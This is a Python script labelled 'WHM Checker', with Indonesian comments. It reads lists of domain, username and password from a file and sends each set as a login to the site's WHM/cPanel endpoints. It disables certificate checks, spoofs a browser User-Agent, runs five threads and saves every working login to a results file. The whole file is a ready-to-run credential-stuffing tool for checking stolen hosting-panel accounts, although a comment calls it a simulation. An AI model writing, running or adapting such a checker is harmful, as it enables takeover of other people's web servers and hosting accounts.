import os
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.live import Live
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
import warnings

# Menonaktifkan peringatan InsecureRequestWarning
warnings.filterwarnings("ignore", message="Unverified HTTPS request")

# Membaca data dari file
def read_whm_data(filename):
    data = []
    with open(filename, 'r') as file:
        for line in file:
            parts = line.strip().split('|')
            if len(parts) == 3:
                data.append(parts)
    return data

# Fungsi untuk mensimulasikan pengujian login dengan User-Agent
def test_login(credentials):
    domain, username, password, user_agent = credentials
    headers = {'User-Agent': user_agent}
    
    urls = [
        f"https://{domain}/whm",
        f"https://{domain}:2087"
    ]
    
    for url in urls:
        try:
            response = requests.post(url, data={'username': username, 'password': password}, headers=headers, verify=False)
            # Periksa status code dan konten respons
            if response.status_code == 200:
                if "File Manager" in response.text:  # Mengindikasikan login berhasil
                    return (url, username, password, "live")
        except requests.RequestException:
            continue

    return (urls[0], username, password, "die")

# Menampilkan data dalam format tabel dan menyimpan hasil ke file
def display_whm_data(data, user_agent):
    table = Table(title="WHM Checker")
    table.add_column("URL", justify="left", style="blue")
    table.add_column("Username", justify="left", style="magenta")
    table.add_column("Password", justify="left", style="green")
    table.add_column("Status", justify="left", style="yellow")

    results = []
    
    # Buka file untuk menyimpan hasil "live"
    with open("whmhasil.txt", "w") as hasil_file:
        with Live(table, refresh_per_second=1) as live:
            with ThreadPoolExecutor(max_workers=5) as executor:
                futures = {executor.submit(test_login, (domain, username, password, user_agent)): (domain, username, password) for domain, username, password in data}
                
                for future in as_completed(futures):
                    result = future.result()
                    results.append(result)
                    url, username, password, status = result
                    
                    # Menambahkan baris ke tabel dengan status
                    table.add_row(url, username, password, status)

                    # Simpan hanya jika status "live"
                    if status == "live":
                        hasil_file.write(f"{url}|{username}|{password}|{status}\n")
                        hasil_file.flush()  # Flush hasil ke file setelah setiap penulisan

                    # Perbarui tampilan live
                    live.update(table)

def main():
    global console
    console = Console()

    # Membersihkan layar terminal
    os.system("clear")
    
    # Menampilkan banner
    banner = Panel("WHM CHECKER", title="Banner", border_style="bold blue")
    console.print(banner)

    # Membaca data dari whm.txt
    whm_data = read_whm_data("whm.txt")

    # Definisikan User-Agent
    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"

    # Menampilkan data
    if whm_data:
        display_whm_data(whm_data, user_agent)
    else:
        console.print("No data found in whm.txt", style="red")

if __name__ == "__main__":
    main()